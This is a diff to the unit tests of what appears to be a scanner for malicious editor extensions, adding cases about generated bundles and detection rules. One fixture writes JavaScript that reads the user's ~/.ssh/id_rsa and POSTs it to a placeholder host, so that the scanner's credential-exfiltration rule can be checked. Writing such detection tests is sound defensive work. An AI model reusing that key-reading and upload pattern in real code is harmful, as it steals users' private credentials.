@@ -181,7 +181,7 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(bundle["metadata"]["schema_version"], "2.2")
         self.assertEqual(bundle["metadata"]["profile"], "smart")
         self.assertEqual(bundle["metadata"]["source"], "fixtures")
-        self.assertEqual(bundle["metadata"]["policy_version"], "3.0.0-calibration.2")
+        self.assertEqual(bundle["metadata"]["policy_version"], "3.0.0-calibration.3")
         self.assertEqual(bundle["summary"]["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
         self.assertEqual(bundle["summary"]["summary"]["suspicious"], 2)
         self.assertIn("rules", bundle["rules"])
@@ -1179,8 +1179,8 @@ class ScannerTests(unittest.TestCase):
 
             report = scan_extension(root)
 
-        self.assertEqual(report.verdict, "clean")
-        self.assertNotIn("obfuscation-execution-network", {finding.rule_id for finding in report.findings})
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertIn("obfuscation-execution-network", {finding.rule_id for finding in report.findings})
         self.assertEqual(report.analysis_coverage["coverage_percent"], 100)
 
     def test_bundle_classification_is_independent_of_coverage_limit(self) -> None:
@@ -1192,6 +1192,61 @@ class ScannerTests(unittest.TestCase):
         self.assertTrue(_is_generated_code_blob("out/extension.js", medium_minified))
         self.assertTrue(_is_generated_code_blob("out/extension.js", large_compiled))
         self.assertFalse(_is_generated_code_blob("src/extension.js", "const x=1;\n" * 100))
+
+    def test_generated_bundle_does_not_create_file_wide_csp_finding(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"webview-bundle","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "createWebviewPanel();" + "const filler=1;" * 20_000,
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertNotIn("webview-csp-missing", {finding.rule_id for finding in report.findings})
+
+    def test_generated_bundle_preserves_real_credential_network_flow_detection(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"generated-exfil","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const fs=require('fs');"
+                "const key=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');"
+                "fetch('https://example.invalid',{method:'POST',body:key});"
+                + "const filler=1;" * 20_000,
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertIn(
+            "credential-exfiltration-chain",
+            {finding.rule_id for finding in report.findings},
+        )
+
+    def test_neighboring_minified_call_does_not_contaminate_configuration_update(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"bounded-call","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "workspace.getConfiguration('github').update('copilot.instructions',value),"
+                "commands.executeCommand('trivy.loginWithToken');",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertNotIn("credential-config-update", {finding.rule_id for finding in report.findings})
 
     def test_declared_dist_entrypoint_is_never_silently_skipped(self) -> None:
         with TemporaryDirectory() as tmp:
